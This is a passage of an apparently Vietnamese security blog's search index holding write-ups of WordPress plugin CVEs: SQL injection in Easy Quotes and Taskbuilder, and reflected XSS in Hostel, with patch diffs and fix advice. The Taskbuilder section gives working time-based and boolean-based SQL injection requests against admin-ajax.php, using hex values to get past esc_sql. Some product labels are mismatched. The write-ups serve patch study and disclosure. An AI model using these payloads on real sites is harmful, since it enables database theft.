kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh 